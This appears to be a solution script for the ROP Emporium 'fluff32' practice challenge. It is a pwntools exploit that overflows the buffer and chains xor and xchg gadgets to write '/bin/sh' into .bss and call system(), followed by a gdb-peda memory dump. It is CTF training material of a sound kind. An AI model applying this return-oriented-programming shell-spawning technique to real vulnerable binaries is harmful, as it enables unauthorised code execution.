#!/usr/bin/python

from pwn import *

s = process('./fluff32')
s.clean()

bss = 0x804a040
system = 0x08048430

# x xor 0 = x
# 0x08048697 : xor byte ptr [ecx], bl ; ret
xor_ptr_ecx_bl = 0x08048697

# 0x08048671 : xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; ret
xor_edx_edx = 0x08048671

# 0x0804867b : xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; ret
xor_edx_ebx = 0x0804867b

# 0x08048689 : xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced0 ; ret
xchg_edx_ecx = 0x08048689

# 0x080483e1 : pop ebx ; ret
pop_ebx = 0x080483e1

# 0x080488ba : inc ecx ; ret
inc_ecx = 0x080488ba


write_bin_sh_to_bss = p32(xor_edx_edx)       # set edx = 0   
write_bin_sh_to_bss += 'BBBB'
write_bin_sh_to_bss += p32(pop_ebx)          # set ebx = bss   
write_bin_sh_to_bss += p32(bss + 4)          # [bss] != 0, but [bss + 4] == 0 
write_bin_sh_to_bss += p32(xor_edx_ebx)      # set edx = bss    (0 xor ebx = ebx)
write_bin_sh_to_bss += 'BBBB'
write_bin_sh_to_bss += p32(xchg_edx_ecx)     # set ecx = bss
write_bin_sh_to_bss += 'BBBB'

for char in '/bin/sh\x00':
    write_bin_sh_to_bss += p32(pop_ebx)          # set ebx = '/bin/sh\x00'[i]
    write_bin_sh_to_bss += p32(ord(char))
    write_bin_sh_to_bss += p32(xor_ptr_ecx_bl)   # set [ecx] = '/' (bss + 4 contains 0s and (0 xor '/' = '/'))
    write_bin_sh_to_bss += p32(inc_ecx)          # ecx+1


payload = 'A' * 44
payload += write_bin_sh_to_bss
payload += p32(system)
payload += 'BBBB'
payload += p32(bss + 4)

'''
context.terminal = ["terminator", "-e"]
gdb.attach(s,
"""
b * main
b * pwnme+85
""")
'''

s.sendline(payload)
s.interactive()



'''
.bss = 0x804a040
gdb-peda$ x/32wx 0x804a040
0x804a040 <stderr@@GLIBC_2.0>:	0xf7f48cc0	0x00000000	0x00000000	0x00000000  <---- ! [bss] != 0, but [bss + 4] == 0
0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a060 <stdin@@GLIBC_2.0>:	0xf7f485a0	0xf7f48d60	0x00000000	0x00000000
0x804a070:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a080:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a090:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0a0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0b0:	0x00000000	0x00000000	0x00000000	0x00000000
gdb-peda$ vmmap
Start      End        Perm	Name
0x08048000 0x08049000 r-xp	/home/osboxes/Desktop/ROPEmporium/32/fluff32
0x08049000 0x0804a000 r--p	/home/osboxes/Desktop/ROPEmporium/32/fluff32
0x0804a000 0x0804b000 rw-p	/home/osboxes/Desktop/ROPEmporium/32/fluff32
0x09c1f000 0x09c41000 rw-p	[heap]
0xf7d95000 0xf7d96000 rw-p	mapped
0xf7d96000 0xf7f46000 r-xp	/lib/i386-linux-gnu/libc-2.23.so
0xf7f46000 0xf7f48000 r--p	/lib/i386-linux-gnu/libc-2.23.so
0xf7f48000 0xf7f49000 rw-p	/lib/i386-linux-gnu/libc-2.23.so
0xf7f49000 0xf7f4c000 rw-p	mapped
0xf7f68000 0xf7f69000 rw-p	mapped
0xf7f69000 0xf7f6c000 r--p	[vvar]
0xf7f6c000 0xf7f6e000 r-xp	[vdso]
0xf7f6e000 0xf7f91000 r-xp	/lib/i386-linux-gnu/ld-2.23.so
0xf7f91000 0xf7f92000 r--p	/lib/i386-linux-gnu/ld-2.23.so
0xf7f92000 0xf7f93000 rw-p	/lib/i386-linux-gnu/ld-2.23.so
0xffbbf000 0xffbe0000 rw-p	[stack]
'''

























